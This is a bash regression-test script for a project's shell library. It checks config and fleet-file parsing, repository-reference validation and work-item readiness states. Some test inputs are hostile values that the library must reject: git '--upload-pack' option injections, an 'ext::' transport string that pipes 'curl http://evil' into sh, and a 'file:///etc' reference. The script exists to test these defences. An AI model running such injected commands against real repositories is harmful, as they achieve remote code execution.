#!/usr/bin/env bash
# Copyright (c) 2026 A.I. Hero, Inc.
# All Rights Reserved.

# Regression table for scripts/hero-lib.sh.
#
# Scoped deliberately: only the two functions with real failure modes are
# covered — hero_field (parses attacker-controlled repo content and feeds it to
# git/gh) and hero_ready_items (parses hand-written frontmatter and previously
# aborted the caller's shell on it). The thin wrappers around them are not
# tested; a test there would pin prose, not behavior.
#
# Every case below is one that was, or could again be, WRONG SILENTLY — the
# listing coming back empty, a value truncated, a malformed id taking the whole
# function down. Loud failures need no regression table.
#
# Usage: bash scripts/hero-lib.test.sh

set -uo pipefail

LIB="$(cd "$(dirname "$0")" && pwd)/hero-lib.sh"
# shellcheck source=/dev/null
. "$LIB" || { echo "cannot source $LIB"; exit 1; }

PASS=0
FAIL=0

check() { # name expected actual
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL  %s\n      expected: [%s]\n      actual:   [%s]\n' "$1" "$2" "$3"
  fi
}

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# ---------- hero_field -----------------------------------------------------

mkdir -p "$TMP/cfg"
cat > "$TMP/cfg/HERO.md" <<'EOF'
# Hero Configuration

## Repository

- default-branch: main # the trunk
- quoted-value: "develop"
- empty-value:
- spaced-value:    padded
EOF

check "field: strips trailing comment" \
  "main" "$(hero_field default-branch "$TMP/cfg")"
check "field: strips surrounding quotes" \
  "develop" "$(hero_field quoted-value "$TMP/cfg")"
check "field: trims padding" \
  "padded" "$(hero_field spaced-value "$TMP/cfg")"

hero_field absent-key "$TMP/cfg" >/dev/null 2>&1
check "field: absent returns 1" "1" "$?"

hero_field empty-value "$TMP/cfg" >/dev/null 2>&1
check "field: present-but-empty returns 1" "1" "$?"

# Option injection: a value beginning with `-` reaches git as an OPTION.
# `git fetch origin --upload-pack=<cmd>` executes <cmd> through a shell, so a
# checked-in HERO.md in a cloned repo becomes arbitrary code execution.
cat > "$TMP/cfg/HERO.md" <<'EOF'
- default-branch: --upload-pack=touch /tmp/hero_lib_test_pwned;git-upload-pack
EOF
hero_field default-branch "$TMP/cfg" >/dev/null 2>&1
check "field: rejects leading-dash value (option injection)" "2" "$?"
check "field: rejected value falls back to main" \
  "main" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"

# ---------- fleet ----------------------------------------------------------
#
# FLEET.md rows feed `cd` in subagents, so a wrong row silently runs a skill
# in the wrong repo. Every case here is a listing that could come back
# plausible-but-wrong: the first repo's field for the second repo, an example
# from a code fence, a heading outside ## Repos.

mkdir -p "$TMP/fleet" "$TMP/nofleet/repo"
# hero_fleet_root prints a physical path; macOS mktemp hands back the /var
# symlink, so resolve the fixture the same way or every path check fails.
F="$(cd "$TMP/fleet" && pwd -P)"
mkdir -p "$F/auth" "$F/web/deep"
cat > "$F/FLEET.md" <<'EOF'
# Fleet

## Fleet

- name: acme
- port-range: 33000-33099
- port: 1 # a fleet-level key that must not leak into repo reads

### sub

- after-h3: still-fleet

## Repos

### auth

- group: Apps
- port: "33000" # claimed

#### deeper

- deep: h4-does-not-end-the-block

### web

- path: "./sites/web/"
- group: apps
- port: 33001

### absent

- path: /opt/absent

### auth

- group: apps

### ctl

- port: 1	2

### alpha

- port: abc

### outside

- path: ../

### notes

- group: none

### bad path

- path: ./x

### dashed

- path: --upload-pack=evil

## Conventions

### example

- port: 99999

```
### fenced
- port: 11111
```
EOF

# The heading's trailing spaces cannot live in this file — the
# trailing-whitespace hook strips them — so they are added after the heredoc.
awk '!done && /^### auth$/ { print "### auth   "; done = 1; next } { print }' "$F/FLEET.md" > "$F/FLEET.md.tmp" && mv "$F/FLEET.md.tmp" "$F/FLEET.md"

check "fleet-root: found from a nested dir" \
  "$F" "$(hero_fleet_root "$F/web/deep")"
check "fleet-root: the fleet folder itself" \
  "$F" "$(hero_fleet_root "$F")"
hero_fleet_root "$TMP/nofleet/repo" >/dev/null 2>&1; rc=$?
# TMP lives under a system temp dir that carries no FLEET.md, so the walk
# must reach / and fail rather than find a stray file on the way up.
check "fleet-root: absent returns 1" "1" "$rc"

hero_at_fleet_root "$F"; check "at-fleet-root: FLEET.md and no HERO.md" "0" "$?"
hero_at_fleet_root "$F/auth"; check "at-fleet-root: a repo dir is not" "1" "$?"
touch "$F/HERO.md"
hero_at_fleet_root "$F"; check "at-fleet-root: HERO.md beside FLEET.md means repo" "1" "$?"
rm "$F/HERO.md"

check "fleet-field: reads the ## Fleet section" \
  "acme" "$(hero_fleet_field name "$F")"
check "fleet-field: an H3 inside ## Fleet does not end the section" \
  "still-fleet" "$(hero_fleet_field after-h3 "$F")"
check "repo-field: a trailing-whitespace heading still matches" \
  "33000" "$(hero_fleet_repo_field auth port "$F")"
check "repo-field: an H4 does not end an H3 block" \
  "h4-does-not-end-the-block" "$(hero_fleet_repo_field auth deep "$F")"
hero_fleet_repo_field ctl port "$F" >/dev/null 2>&1
check "repo-field: a control character is refused (rc 2)" "2" "$?"
check "fleet-field: port-range is not port" \
  "1" "$(hero_fleet_field port "$F")"
check "repo-field: second repo gets its own value, not the first's" \
  "33001" "$(hero_fleet_repo_field web port "$F")"
check "repo-field: fleet-level port does not leak into a repo block" \
  "33000" "$(hero_fleet_repo_field auth port "$F")"
hero_fleet_repo_field notes port "$F" >/dev/null 2>&1
check "repo-field: absent in the block returns 1" "1" "$?"
hero_fleet_repo_field example port "$F" >/dev/null 2>&1
check "repo-field: an H3 outside ## Repos does not answer for a repo row" "1" "$?"
hero_fleet_repo_field fenced port "$F" >/dev/null 2>&1
check "repo-field: a fenced example row is skipped" "1" "$?"
hero_md_field "$F/FLEET.md" port auth >/dev/null 2>&1
check "md-field: a bare BLOCK name is rejected, not read as absent" "2" "$?"

check "repos: TSV — group lowercased, port de-quoted, comment stripped, trailing slash dropped, absolute kept, fenced/foreign rows absent" \
  "$(printf 'auth\t%s/auth\tapps\t33000\nweb\t%s/sites/web\tapps\t33001\nabsent\t/opt/absent\tnone\t\nnotes\t%s/notes\tnone\t\n' "$F" "$F" "$F")" \
  "$(hero_fleet_repos "$F" 2>/dev/null)"
check "repos: duplicate, ctrl-char, non-numeric port, outside path, space name, dashed path are each skipped" \
  "6" "$(hero_fleet_repos "$F" 2>&1 >/dev/null | grep -c skipping)"
hero_fleet_repos "$F" >/dev/null 2>&1
check "repos: skipped rows return 3, never a clean 0" "3" "$?"
check "repos: the outside-the-fleet reason names the resolved path" \
  "1" "$(hero_fleet_repos "$F" 2>&1 >/dev/null | grep -c "outside the fleet")"

# zsh ties `path` to PATH: a `local path` in the lib empties it for the
# function and awk vanishes — an empty registry with rc 0. Sourcing from
# zsh is how every SKILL.md bash block runs on macOS.
if command -v zsh >/dev/null 2>&1; then
  check "repos: sourced from zsh, still lists" \
    "auth" "$(zsh -c ". '$LIB'; hero_fleet_repos '$F' 2>/dev/null | head -1 | cut -f1")"
fi

# A committed FLEET.md (HERO.md beside it) is repo content, never the fleet.
mkdir -p "$F/auth/deep"; printf '## Repos\n' > "$F/auth/FLEET.md"; touch "$F/auth/HERO.md"
check "fleet-root: passes over a FLEET.md inside a repo and keeps walking" \
  "$F" "$(hero_fleet_root "$F/auth/deep" 2>/dev/null)"
rm "$F/auth/FLEET.md" "$F/auth/HERO.md"
check "fleet-root: prints the physical path from a symlinked start" \
  "$F" "$(hero_fleet_root "$TMP/fleet/web/deep")"
check "fleet-root: defaults to PWD, not the git toplevel" \
  "$F" "$(cd "$F" && git init -q . 2>/dev/null; cd "$F/web" && hero_fleet_root)"
rm -rf "$F/.git"

# ---------- hero_normalize_repo_ref ----------------------------------------
#
# target-repo flows from HERO.md into `git ls-remote`/`git clone` as a URL.
# hero_field blocks leading-dash/control-chars but NOT git's `ext::` transport
# helper, which executes a shell command — the RCE this gate exists to stop.

# The exploit shape: passes hero_field, must be rejected here.
hero_normalize_repo_ref 'ext::sh -c "curl http://evil|sh"' >/dev/null 2>&1
check "repo-ref: rejects ext:: transport helper (RCE)" "2" "$?"
hero_normalize_repo_ref 'file:///etc' >/dev/null 2>&1
check "repo-ref: rejects file:// transport" "2" "$?"
hero_normalize_repo_ref 'ftp://host/x' >/dev/null 2>&1
check "repo-ref: rejects unknown URL scheme" "2" "$?"
hero_normalize_repo_ref 'no-such-dir/that/is/deep' >/dev/null 2>&1
check "repo-ref: rejects a bare non-existent path" "2" "$?"

# Accepted forms, normalized on stdout.
check "repo-ref: OWNER/NAME expands to a github URL" \
  "https://github.com/acme/widgets" "$(hero_normalize_repo_ref 'acme/widgets')"
check "repo-ref: https URL passes through" \
  "https://example.com/x.git" "$(hero_normalize_repo_ref 'https://example.com/x.git')"
check "repo-ref: scp-style ssh passes through" \
  "git@github.com:acme/widgets.git" "$(hero_normalize_repo_ref 'git@github.com:acme/widgets.git')"
check "repo-ref: none passes through unchanged" \
  "none" "$(hero_normalize_repo_ref none)"
check "repo-ref: an existing local dir passes through" \
  "$TMP/cfg" "$(hero_normalize_repo_ref "$TMP/cfg")"

# ---------- hero_ready_items -----------------------------------------------

W="$TMP/w/.plans"
mkdir -p "$W"

item() { # file id title status deps [kind]
  {
    printf -- '---\nid: %s\n' "$2"
    if [ -n "${6:-}" ]; then printf 'kind: %s\n' "$6"; fi
    printf 'title: %s\nstatus: %s\ndepends_on: %s\n---\n' "$3" "$4" "$5"
  } > "$W/$1"
}

item 001-done.md 1 "Finished" "done" "[]"
item 002-todo.md 2 "Unblocked" "todo" "[1]"
item 003-blocked.md 3 "Waiting" "todo" "[2]"
item 004-active.md 4 "In flight" "in-progress" "[1]"
item 005-pad.md 007 "Zero padded" "done" "[]"
item 006-padref.md 6 "Refs padded id" "todo" "[7]"
item 007-dangling.md 8 "Dangling ref" "todo" "[99]"
item 008-caps.md 9 "Capitalized status" "DONE" "[]"

OUT="$(hero_ready_items "$W" 2>/dev/null)"

# state_of FILE [LISTING] — the STATE column for FILE, defaulting to $OUT.
state_of() { printf '%s' "${2:-$OUT}" | awk -v f="$1" '$2 == f { print $1; exit }'; }

check "ready: satisfied dep is READY"        "READY"   "$(state_of 002-todo.md)"
check "ready: unmet dep is blocked"          "blocked" "$(state_of 003-blocked.md)"
check "ready: in-progress is active, not READY" "active" "$(state_of 004-active.md)"
check "ready: done items are listed"         "done"    "$(state_of 001-done.md)"
# 007 and 7 must compare equal, or a zero-padded legacy id blocks its dependents.
check "ready: zero-padded id resolves"       "READY"   "$(state_of 006-padref.md)"
# A dangling reference must block, not silently resolve — and must SAY it is
# dangling: nothing will ever mark a nonexistent id done, so an unnamed
# dangling ref reads as ordinary waiting when it is actually forever.
check "ready: dangling dep blocks"           "blocked" "$(state_of 007-dangling.md)"
printf '%s' "$OUT" | grep -q '007-dangling.md.*\[missing dep: 99\]'
check "ready: dangling dep is named on the listing" "0" "$?"
# Capture stderr rather than piping into grep -q: with pipefail, grep's early
# exit SIGPIPEs the producer and the pipeline reports 141 despite a match.
ERR0="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR0" | grep -q "no item carries"
check "ready: dangling dep warns on stderr" "0" "$?"
# `DONE` must count as done, or every dependent stays blocked forever.
check "ready: status match is case-insensitive" "done"  "$(state_of 008-caps.md)"

# Ids are integers by convention, but a hand-written oddball must degrade
# gracefully: a non-numeric id used to be a FATAL arithmetic error that
# emitted NOTHING — a caller reads that as an empty plate, not as a failure.
item 009-strid.md "AH-12" "String id" "done" "[]"
item 00a-strdep.md "b3f2" "Depends on string id" "todo" "[ah-12]"
OUT2="$(hero_ready_items "$W" 2>/dev/null)"
COUNT2="$(printf '%s' "$OUT2" | grep -c . )"
check "ready: string id does not blank the listing" "10" "$COUNT2"
# Ids compare case-insensitively — `ah-12` must resolve against `AH-12`.
check "ready: string-id dep resolves case-insensitively" "READY" "$(state_of 00a-strdep.md "$OUT2")"

# The store listing is data; notes belong on stderr.
NOTE="$(hero_ready_items "$TMP/nonexistent-store" 2>/dev/null)"
check "ready: missing store prints nothing to stdout" "" "$NOTE"

# Sourced into a caller's shell, a bare `cd` reroutes every later relative path.
BEFORE="$PWD"
hero_ready_items "$W" >/dev/null 2>&1
check "ready: does not change caller's cwd" "$BEFORE" "$PWD"

# ---------- hero_item_field ------------------------------------------------

cat > "$W/010-colon.md" <<'EOF'
---
id: 10
title: Fix auth: token refresh
status: todo
depends_on: []
success: e2e green: login under 30s
---
EOF

# Splitting on every ': ' truncated any value containing a colon — and
# `success` is the field Step 1c reads to decide whether to build.
check "item_field: title keeps its colon" \
  "Fix auth: token refresh" "$(hero_item_field "$W/010-colon.md" title)"
check "item_field: success keeps its colon" \
  "e2e green: login under 30s" "$(hero_item_field "$W/010-colon.md" success)"

# ---------- silent-READY regressions ---------------------------------------
#
# Each of these reported an item as READY (or its dependent as permanently
# blocked) with nothing on stderr — an agent would have picked up work whose
# dependencies do not exist, or skipped work that was actually unblocked.

cat > "$W/011-mldeps.md" <<'EOF'
---
id: 11
title: Block sequence deps
status: todo
depends_on:
  - 99
  - 100
---
EOF
# YAML block sequences are the standard list form. Only the inline form parsed,
# so this yielded "no dependencies" and the item was handed out as READY.
OUT3="$(hero_ready_items "$W" 2>/dev/null)"
check "deps: block sequence blocks" "blocked" "$(state_of 011-mldeps.md "$OUT3")"

cat > "$W/012-quoted.md" <<'EOF'
---
id: 12
title: Quoted status
status: "done"
depends_on: []
---
EOF
cat > "$W/013-dep.md" <<'EOF'
---
id: 13
title: Depends on the quoted-done item
status: todo
depends_on: [12]
---
EOF
item 015-qdep.md 15 "Quoted inline dep" "todo" '["12"]'
OUT4="$(hero_ready_items "$W" 2>/dev/null)"
# A quoted status did not equal `done`, so every dependent blocked forever.
check "status: quoted done counts as done" "done"  "$(state_of 012-quoted.md "$OUT4")"
check "status: its dependent unblocks"     "READY" "$(state_of 013-dep.md "$OUT4")"
# The inline-array parser must strip entry quotes like the block parser does,
# or `depends_on: ["12"]` emits `"12"` and never matches id 12.
check "deps: quoted inline entry resolves" "READY" "$(state_of 015-qdep.md "$OUT4")"

cat > "$W/014-body.md" <<'EOF'
---
id: 14
title: Body mentions a status
depends_on: []
---

Run until `status: done` appears in the log.
EOF
OUT5="$(hero_ready_items "$W" 2>/dev/null)"
# Frontmatter only — a body line must not be read as the item's own field. This
# item has no status line of its own, so it defaults to `new`; if the body's
# `status: done` were read it would show `done` instead.
check "field: body line is not frontmatter" "new" "$(state_of 014-body.md "$OUT5")"

hero_ready_items "$TMP/definitely-not-a-store" >/dev/null 2>&1
check "ready: missing store returns non-zero" "1" "$?"

# An empty store is a healthy empty plate, not a failure (zsh aborted here
# with a raw unmatched-glob error and rc=1 before nullglob was set).
mkdir -p "$TMP/empty-store"
EMPTY="$(hero_ready_items "$TMP/empty-store" 2>/dev/null)"
check "ready: empty store returns success" "0" "$?"
check "ready: empty store prints nothing" "" "$EMPTY"

# ---------- id integrity -----------------------------------------------------
#
# The space-delimited id sets are only sound if no id can contain the
# delimiter. A whitespace id (`id: AH 12`) used to inject two tokens, letting
# a dep on a NONEXISTENT id resolve — and count as done — with no warning:
# the exact silent-READY failure the dangling-dep report exists to prevent.

item 016-wsid.md "WS tok9" "Whitespace id" "done" "[]"
item 017-wsdep.md 17 "Deps on token of whitespace id" "todo" "[tok9]"
OUT6="$(hero_ready_items "$W" 2>/dev/null)"
ERR6="$(hero_ready_items "$W" 2>&1 >/dev/null)"
check "ready: dep on a whitespace-id token stays blocked" "blocked" "$(state_of 017-wsdep.md "$OUT6")"
printf '%s' "$ERR6" | grep -q "whitespace-containing id"
check "ready: whitespace id warns on stderr" "0" "$?"

# Duplicate ids (after normalization — 007 is already item 005's id) must be
# named: dependents may resolve against the wrong twin.
item 018-dup7.md 7 "Duplicate of padded id 007" "todo" "[]"
ERR7="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR7" | grep -q "duplicate id 7"
check "ready: normalized duplicate id warns on stderr" "0" "$?"

# An item with no usable id cannot participate in dependency order — handing
# it out as READY would have a consumer work an item nothing can depend on.
printf 'just prose, no frontmatter\n' > "$W/019-prose.md"
OUT7="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: id-less item is invalid, not READY" "invalid" "$(state_of 019-prose.md "$OUT7")"

# discovered_from is provenance, never a blocker: a DANGLING discovered_from
# must not block (or even warn) — the readiness engine only parses depends_on.
cat > "$W/020-disc.md" <<'EOF'
---
id: 20
title: Discovered while working another item
status: todo
depends_on: []
discovered_from: 999
---
EOF
OUT8="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: dangling discovered_from never blocks" "READY" "$(state_of 020-disc.md "$OUT8")"

# ---------- planning gate ----------------------------------------------------
#
# The planning state is the human ready-mark gate: emitted items sit in
# `planning` until a person flips them to `todo`. Each case here pins a way the
# gate could be silently defeated — an emitted item handed to one-shot with no
# ready-mark, the precise silent-READY shape this table exists to catch.

item 021-planning.md 21 "Awaiting ready-mark" "planning" "[1]"
item 022-plandep.md 22 "Depends on a planning item" "todo" "[21]"
cat > "$W/023-qplan.md" <<'EOF'
---
id: 23
title: Quoted planning
status: "planning"
depends_on: []
---
EOF
item 024-capplan.md 24 "Capitalized planning" "Planning" "[]"
# `plan` is the display LABEL, `planning` the keyword — an intuitive-but-wrong
# shortening that previously fell through to READY, defeating the whole gate.
item 025-typo.md 25 "Status typo" "plan" "[1]"
OUT9="$(hero_ready_items "$W" 2>/dev/null)"
# Planning items list as `plan`, never READY, even with every dependency done.
check "planning: item lists as plan, not READY" "plan"    "$(state_of 021-planning.md "$OUT9")"
check "planning: quoted planning counts"        "plan"    "$(state_of 023-qplan.md "$OUT9")"
check "planning: capitalized planning counts"   "plan"    "$(state_of 024-capplan.md "$OUT9")"
# A dependent of a planning item stays blocked (the id EXISTS — it is just not
# done — so this is ordinary blocking, NOT a dangling-ref).
check "planning: dependent stays blocked"       "blocked" "$(state_of 022-plandep.md "$OUT9")"
printf '%s' "$OUT9" | grep -q '022-plandep.md.*\[missing dep:'
check "planning: dependent is not mislabeled dangling" "1" "$?"
# An UNRECOGNIZED status (the `plan` typo) must be invalid, never READY.
check "planning: unknown status is invalid, not READY" "invalid" "$(state_of 025-typo.md "$OUT9")"
ERR9="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR9" | grep -q "unrecognized status 'plan'"
check "planning: unknown status warns on stderr" "0" "$?"

# ---------- feature lifecycle (kind: feature) --------------------------------
#
# Wayfare features carry the extended enum todo|planning|ready|implementing|
# reviewing|done. Each case pins a way the mapping could silently regress: a
# `todo` feature handed to one-shot unplanned (backlog must never be READY),
# or the extended statuses leaking into plain items (they must stay invalid).

# Feature-item fixture: `item` with kind defaulted to `feature`.
fitem() { item "$1" "$2" "$3" "$4" "$5" "${6:-feature}"; }

fitem 030-backlog.md 30 "Unplanned feature" "todo" "[]"
fitem 031-fplan.md 31 "Feature being planned" "planning" "[]"
fitem 032-fready.md 32 "Planned and marked ready" "ready" "[1]"
fitem 033-fblocked.md 33 "Ready but blocked" "ready" "[30]"
fitem 034-fimpl.md 34 "Being built" "implementing" "[]"
fitem 035-flegacy.md 35 "Legacy in-progress feature" "in-progress" "[]"
fitem 036-frev.md 36 "PR in review" "reviewing" "[]"
fitem 037-fdone.md 37 "Shipped feature" "done" "[]"
fitem 038-fcaps.md 38 "Capitalized kind" "todo" "[]" "Feature"
fitem 039-ftypo.md 39 "Feature status typo" "in-review" "[]"
# The extended enum is features-only: a PLAIN item claiming `ready` must stay
# invalid — otherwise any item could skip the human ready-mark by declaring it.
item 040-plainready.md 40 "Plain item claiming ready" "ready" "[]"
# Interaction fixtures: dependency resolution, legacy kinds, and the malformed
# values that must land in the loud invalid arm, never a READY-eligible one.
fitem 041-fchain.md 41 "Depends on shipped feature" "ready" "[37]"
item 042-wo.md 42 "Legacy work order" "todo" "[]" "work-order"
printf -- '---\nid: 43\nkind: feature\ntitle: No status line\ndepends_on: []\n---\n' > "$W/043-fnostatus.md"
fitem 044-fcaps.md 44 "Capitalized ready" "Ready" "[]"
# A colon smuggled into status must NOT suffix-match a kind-keyed arm: x:todo
# reaching READY skips the ready-mark; not:done reaching `done` is a split-brain
# (listed done, but done_ids uses exact compare so dependents block forever).
item 045-colon.md 45 "Colon status" "x:todo" "[]"
fitem 046-fcolon.md 46 "Colon feature status" "plan:todo" "[]"
item 047-notdone.md 47 "Colon done status" "not:done" "[]"
# An unknown kind must stay VISIBLE (invalidating it hid nine items, five of
# them security, behind a stderr line nobody reads) yet must never be handed
# out READY — build-todo and plain-todo mean OPPOSITE things, so `kind:
# features` + todo reaching READY would skip the ready-mark. `backlog` is the
# one reading safe under both.
item 048-badkind.md 48 "Typo kind" "todo" "[]" "features"
# Backlog rows still run the dep check: unmet deps annotate the row
# (`wayfare goal` reads it) and a dangling ref warns — a bootstrap typo must
# not be invisible.
fitem 049-fwait.md 49 "Backlog waiting on dep" "todo" "[30]"
fitem 050-fdangle.md 50 "Backlog dangling dep" "todo" "[999]"
OUTF="$(hero_ready_items "$W" 2>/dev/null)"
# A todo feature is on the roadmap but UNPLANNED — never READY.
check "feature: todo lists as backlog, not READY" "backlog" "$(state_of 030-backlog.md "$OUTF")"
check "feature: planning lists as plan"           "plan"    "$(state_of 031-fplan.md "$OUTF")"
# `ready` is the feature state eligible for READY, dep-gated like plain todo.
check "feature: ready with deps done is READY"    "READY"   "$(state_of 032-fready.md "$OUTF")"
check "feature: ready with unmet dep is blocked"  "blocked" "$(state_of 033-fblocked.md "$OUTF")"
check "feature: implementing is active"           "active"  "$(state_of 034-fimpl.md "$OUTF")"
check "feature: legacy in-progress still active"  "active"  "$(state_of 035-flegacy.md "$OUTF")"
check "feature: reviewing lists as review"        "review"  "$(state_of 036-frev.md "$OUTF")"
check "feature: done is done"                     "done"    "$(state_of 037-fdone.md "$OUTF")"
check "feature: kind match is case-insensitive"   "backlog" "$(state_of 038-fcaps.md "$OUTF")"
check "feature: unknown status is invalid"        "invalid" "$(state_of 039-ftypo.md "$OUTF")"
check "feature: plain item with ready is invalid" "invalid" "$(state_of 040-plainready.md "$OUTF")"
# A done FEATURE must count in done_ids, or every roadmap chain stalls forever.
check "feature: dep on a done feature is READY"   "READY"   "$(state_of 041-fchain.md "$OUTF")"
# Any known non-feature kind rides the plain arms — legacy work orders still list.
check "feature: kind work-order behaves as plain" "READY"   "$(state_of 042-wo.md "$OUTF")"
# No status line means the item was just created and nobody has triaged it —
# `new`, never READY. It used to default to `todo`, which for a plain item meant
# READY-eligible: untriaged items went straight to one-shot.
check "feature: empty status defaults to new" "new" "$(state_of 043-fnostatus.md "$OUTF")"
check "feature: capitalized ready is READY"       "READY"   "$(state_of 044-fcaps.md "$OUTF")"
check "feature: colon status is invalid (plain)"  "invalid" "$(state_of 045-colon.md "$OUTF")"
check "feature: colon status is invalid (feature)" "invalid" "$(state_of 046-fcolon.md "$OUTF")"
check "feature: colon-done is invalid, not done"  "invalid" "$(state_of 047-notdone.md "$OUTF")"
check "feature: unknown kind is backlog, not invalid" "backlog" "$(state_of 048-badkind.md "$OUTF")"
# Backlog rows carry dep state without ever being READY.
check "feature: backlog with unmet dep stays backlog" "backlog" "$(state_of 049-fwait.md "$OUTF")"
printf '%s' "$OUTF" | grep -q '049-fwait.md.*\[deps unmet'
check "feature: backlog unmet deps are annotated" "0" "$?"
printf '%s' "$OUTF" | grep -q '050-fdangle.md.*missing dep: 999'
check "feature: backlog dangling dep is annotated" "0" "$?"
ERRF="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRF" | grep -q "unrecognized status 'in-review'.*kind: feature"
check "feature: unknown status names the feature enum on stderr" "0" "$?"
printf '%s' "$ERRF" | grep -q "045-colon.md has a malformed status/kind"
check "feature: colon status warns on stderr"     "0" "$?"
printf '%s' "$ERRF" | grep -q "048-badkind.md has unrecognized kind 'features'"
check "feature: unknown kind warns on stderr"     "0" "$?"
printf '%s' "$ERRF" | grep -q "050-fdangle.md depends_on '999'"
check "feature: backlog dangling dep warns on stderr" "0" "$?"

# ---------- kind classes: architecture, polish, feedback, goal, new ---------
#
# `architecture` and `polish` share the build enum with `feature`; the feedback
# kinds carry their own delivery enum and must NEVER be READY — nothing builds
# a feedback item, it gets delivered, so handing one to one-shot is always
# wrong.
item 051-arch.md 51 "Planned architecture change" "ready" "[]" "architecture"
item 052-archtodo.md 52 "Unplanned architecture change" "todo" "[]" "architecture"
item 053-archrev.md 53 "Architecture PR in review" "reviewing" "[]" "architecture"
item 075-pol.md 75 "Dashboard header spacing" "ready" "[]" "polish"
item 076-poltodo.md 76 "Card grid gutters" "todo" "[]" "polish"
item 077-polrev.md 77 "Polish PR in review" "reviewing" "[]" "polish"
# `security` (a bot's bump PR taken to deployment by `wayfare deps`, or a
# harden fix) rides the build enum. Left off the class table it rides the
# unknown enum instead: ready lists as invalid, todo as backlog — never READY.
item 078-dep.md 78 "Bump lodash to 4.17.21" "ready" "[]" "security"
item 079-deptodo.md 79 "Bump minimist" "todo" "[]" "security"
item 080-deprev.md 80 "Bump in review" "reviewing" "[]" "security"
item 054-df.md 54 "Surface divergence" "todo" "[]" "design-feedback"
item 055-dfq.md 55 "Queued in a packet" "queued" "[]" "design-feedback"
item 056-dfd.md 56 "Filed upstream" "delivered" "[]" "design-feedback"
item 057-dfr.md 57 "Design said no" "rejected" "[]" "design-feedback"
item 058-af.md 58 "Boundary divergence" "todo" "[]" "architecture-feedback"
item 059-dsf.md 59 "Token divergence" "todo" "[]" "design-system-feedback"
# A feedback item claiming a BUILD status must be loud, not quietly READY.
item 060-dfbad.md 60 "Feedback claiming ready" "ready" "[]" "design-feedback"
# `new` is valid in every enum and READY in none of them.
item 065-newplain.md 65 "Fresh plain task" "new" "[]"
item 066-newfeat.md 66 "Fresh feature" "new" "[]" "feature"
item 067-newdf.md 67 "Fresh feedback" "new" "[]" "design-feedback"
# A dependency that is merely `new` is not done, so dependents stay blocked.
item 068-waitnew.md 68 "Waits on a new item" "todo" "[65]"
# A goal spans features. It is never READY — one-shot builds features, and a
# goal handed to it has nothing to build.
item 070-goalnew.md 70 "Fresh goal" "new" "[]" "goal"
item 071-goaltodo.md 71 "Approved goal" "todo" "[]" "goal"
item 072-goalrun.md 72 "Goal being run" "active" "[]" "goal"
item 073-goaldone.md 73 "Achieved goal" "done" "[]" "goal"
item 074-goalbad.md 74 "Goal claiming ready" "ready" "[]" "goal"
OUTK="$(hero_ready_items "$W" 2>/dev/null)"
check "kind: goal new is new"                    "new"      "$(state_of 070-goalnew.md "$OUTK")"
check "kind: goal todo is goal, never READY"     "goal"     "$(state_of 071-goaltodo.md "$OUTK")"
check "kind: goal active is active"              "active"   "$(state_of 072-goalrun.md "$OUTK")"
check "kind: goal done is done"                  "done"     "$(state_of 073-goaldone.md "$OUTK")"
check "kind: goal claiming ready is invalid"     "invalid"  "$(state_of 074-goalbad.md "$OUTK")"
check "status: new on a plain item"              "new"      "$(state_of 065-newplain.md "$OUTK")"
check "status: new on a feature"                 "new"      "$(state_of 066-newfeat.md "$OUTK")"
check "status: new on a feedback item"           "new"      "$(state_of 067-newdf.md "$OUTK")"
check "status: dep on a new item stays blocked"  "blocked"  "$(state_of 068-waitnew.md "$OUTK")"
check "kind: architecture ready is READY"        "READY"    "$(state_of 051-arch.md "$OUTK")"
check "kind: architecture todo is backlog"       "backlog"  "$(state_of 052-archtodo.md "$OUTK")"
check "kind: architecture reviewing is review"   "review"   "$(state_of 053-archrev.md "$OUTK")"
check "kind: polish ready is READY"              "READY"    "$(state_of 075-pol.md "$OUTK")"
check "kind: polish todo is backlog"             "backlog"  "$(state_of 076-poltodo.md "$OUTK")"
check "kind: polish reviewing is review"         "review"   "$(state_of 077-polrev.md "$OUTK")"
check "kind: security ready is READY"            "READY"    "$(state_of 078-dep.md "$OUTK")"
check "kind: security todo is backlog"           "backlog"  "$(state_of 079-deptodo.md "$OUTK")"
check "kind: security reviewing is review"       "review"   "$(state_of 080-deprev.md "$OUTK")"
check "kind: design-feedback todo is feedback"   "feedback" "$(state_of 054-df.md "$OUTK")"
check "kind: design-feedback queued is feedback" "feedback" "$(state_of 055-dfq.md "$OUTK")"
check "kind: design-feedback delivered is done"  "done"     "$(state_of 056-dfd.md "$OUTK")"
check "kind: design-feedback rejected is done"   "done"     "$(state_of 057-dfr.md "$OUTK")"
check "kind: architecture-feedback is feedback"  "feedback" "$(state_of 058-af.md "$OUTK")"
check "kind: design-system-feedback is feedback" "feedback" "$(state_of 059-dsf.md "$OUTK")"
check "kind: feedback claiming ready is invalid" "invalid"  "$(state_of 060-dfbad.md "$OUTK")"
ERRK="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRK" | grep -q "unrecognized status 'ready'.*kind: goal"
check "kind: goal bad status names the goal enum" "0" "$?"
printf '%s' "$ERRK" | grep -q "unrecognized status 'ready'.*kind: design-feedback"
check "kind: feedback bad status names its own enum" "0" "$?"
# A delivered feedback item is TERMINAL, so dependents on it must unblock —
# otherwise a feature waiting on an upstream answer blocks forever.
item 061-waitdf.md 61 "Waits on delivered feedback" "todo" "[56]"
item 062-waitrej.md 62 "Waits on rejected feedback" "todo" "[57]"
# The terminal-state widening is scoped to the three real feedback kinds. An
# UNKNOWN kind claiming `delivered` lists as invalid (plain enum has no such
# status), so counting it terminal would be a split-brain: invisible on the
# listing, yet silently unblocking its dependents.
item 063-fakedeliv.md 63 "Unknown kind claiming delivered" "delivered" "[]" "vibes-feedback"
item 064-waitfake.md 64 "Waits on the fake" "todo" "[63]"
# The hole the old kind-invalidation existed to close: an unknown kind must
# not reach READY through ANY status. `todo` → backlog is tested above; `ready`
# is the arm a "simplification" of the class gate would most likely open.
item 069-badkindready.md 69 "Typo kind claiming ready" "ready" "[]" "features"
